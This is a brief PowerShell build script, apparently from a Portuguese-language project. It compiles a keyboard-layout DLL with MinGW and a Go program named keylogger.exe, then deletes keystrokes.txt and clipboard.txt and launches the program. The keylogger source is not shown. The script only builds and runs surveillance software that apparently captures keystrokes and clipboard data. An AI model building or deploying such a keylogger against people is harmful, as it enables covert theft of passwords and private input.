Write-Output "# Compilando C"
x86_64-w64-mingw32-gcc -c -o keyboard_layout.o keyboard_layout.c
x86_64-w64-mingw32-gcc -shared -o libkeyboard_layout.dll keyboard_layout.o
Write-Output "# Compilando Go"
go build -o keylogger.exe main.go ; del keystrokes.txt; del clipboard.txt ; .\keylogger.exe